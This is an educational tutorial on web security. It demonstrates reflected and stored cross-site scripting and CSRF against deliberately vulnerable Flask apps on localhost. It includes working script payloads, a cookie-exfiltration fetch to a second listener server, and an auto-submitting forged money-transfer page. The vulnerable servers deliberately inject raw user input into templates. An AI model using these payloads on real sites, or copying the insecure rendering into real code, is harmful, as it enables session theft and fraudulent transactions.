# HTTP Security

## Cross-site Scripting

The basic idea behind cross-site scripting is that attacker can inject JavaScript into a web page viewed by a victim.

### Reflected XSS

One way is the **reflected XSS attack**.

Consider the following insecure server:

```python
from flask import Flask, request, make_response, render_template_string

app = Flask(__name__)

@app.route('/set-cookie')
def set_cookie():
    response = make_response("<h2>Cookie Set!</h2><p>A cookie has been set.</p>")
    # Set a harmless cookie
    response.set_cookie('supersecret', 'information')
    return response

@app.route('/')
def home():
    user_input = request.args.get('input', 'No input provided')  # Get user input from query parameter
    # The user_input is directly rendered into the HTML template below, which is vulnerable to XSS
    response = make_response(render_template_string(f"""
    <h2>Reflected XSS Example</h2>
    <p>Your input was: {user_input}</p>
    <form method="get">
        <input type="text" name="input" placeholder="Enter something here..." />
        <input type="submit" />
    </form>
    """))
    return response

if __name__ == "__main__":
    app.run(port=5000)
```

Go to `http://localhost:5000/set-cookie` to set the cookie.

The problem here is that `input` is rendered directly in the page.

For example:

```
http://localhost:5000/?input=<script>alert('XSS')</script>
```

We could do more interesting things like stealing cookies:

```
<script>fetch(`http://localhost:5001/steal-cookie?cookie=${document.cookie}`)</script>
```

### Persistent XSS

One way is the **persistent (stored) XSS attack**.

Consider the following insecure server:

```python
from flask import Flask, request, make_response, render_template_string

app = Flask(__name__)

# Simulating a storage for comments
comments = []

@app.route('/set-cookie')
def set_cookie():
    response = make_response("<h2>Cookie Set!</h2><p>A cookie has been set.</p>")
    # Set a harmless cookie
    response.set_cookie('supersecret', 'information')
    return response


@app.route('/', methods=['GET', 'POST'])
def home():
    print(comments)

    if request.method == 'POST':
        user_comment = request.form['comment']
        comments.append(user_comment)  # Store the comment

    comments_display = '<br>'.join(comments)
    response = make_response(render_template_string(f"""
    <h2>Vulnerable Comment Section</h2>
    {comments_display}
    <form method="post">
        <textarea name="comment"></textarea>
        <input type="submit" />
    </form>
    <p>Visit <a href="/set-cookie">/set-cookie</a> to set a cookie.</p>
    """))
    return response

if __name__ == "__main__":
    app.run(port=5000)
```

The problem is in the way the comments page is created.
It doesn't sanitize the comments.

This means that if an attacker can submit an "executable comment" that comment will be executed.
Of course this would be JavaScript.

For example you could submit this comments:

```
<script>alert("Hi")</script>
```

If a victim navigates to this page, he would also see the alert.

More interesting would be stealing the cookies of the client:

```python
from flask import Flask, request, make_response

app = Flask(__name__)

@app.route('/steal-cookie', methods=['GET'])
def steal_cookie():
    stolen_cookie = request.args.get('cookie', '')
    print(f"Stolen cookie: {stolen_cookie}")

    response = make_response("Cookie stolen!", 200)
    response.headers['Access-Control-Allow-Origin'] = '*'
    return "Cookie stolen!", 200

if __name__ == "__main__":
    app.run(port=5001)
```

We can now submit this comment:

```
<script>fetch(`http://localhost:5001/steal-cookie?cookie=${document.cookie}`)</script>
```

If the victim loads the page now, the page will send a request to `localhost:5001/steal-cookie` together with the victims cookies.
Now the attacker has the victims cookies.

You should protect against this by sanitizing user input of course.
However, **Content Security Policy** allows you to add an additional layer of protection.

# CSRF

Example:

```python
from flask import Flask, request, render_template_string, make_response

app = Flask(__name__)

# Inline HTML Template for the form
HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Bank Transfer</title>
</head>
<body>
    <h1>Transfer Money</h1>
    <form action="http://localhost:5000/transfer" method="POST">
        <input type="text" name="amount" placeholder="Amount" required>
        <input type="text" name="to_account" placeholder="To Account Number" required>
        <button type="submit">Transfer</button>
    </form>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/set-cookie')
def set_cookie():
    response = make_response("<h2>Cookie Set!</h2><p>A cookie has been set.</p>")
    # Set a harmless cookie
    response.set_cookie('authcookie', 'authentication')
    return response

@app.route('/transfer', methods=['POST'])
def transfer():
    # Check if the correct authentication cookie is present
    if request.cookies.get('authcookie') == 'authentication':
        amount = request.form['amount']
        to_account = request.form['to_account']
        return f"Transferred ${amount} to account {to_account}."
    else:
        return "Authentication failed.", 403

if __name__ == '__main__':
    app.run(debug=True)
```

Attack:

```python
from flask import Flask, render_template_string

app = Flask(__name__)

# Inline HTML Template for the malicious page
MALICIOUS_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Harmless Survey</title>
</head>
<body>
    <h1>This Could Be a Harmless Survey</h1>
    <!-- This form will automatically post to the vulnerable Flask app -->
    <form id="fakeForm" action="http://localhost:5000/transfer" method="POST">
        <input type="hidden" name="amount" value="1000">
        <input type="hidden" name="to_account" value="9999-9999">
    </form>
    <script>
        // JavaScript to automatically send a POST request
        window.onload = function() {
            document.getElementById('fakeForm').submit();
        }
    </script>
</body>
</html>
"""

@app.route('/')
def malicious():
    # Render the malicious HTML directly
    return render_template_string(MALICIOUS_HTML)

if __name__ == '__main__':
    app.run(port=5001, debug=True)
```
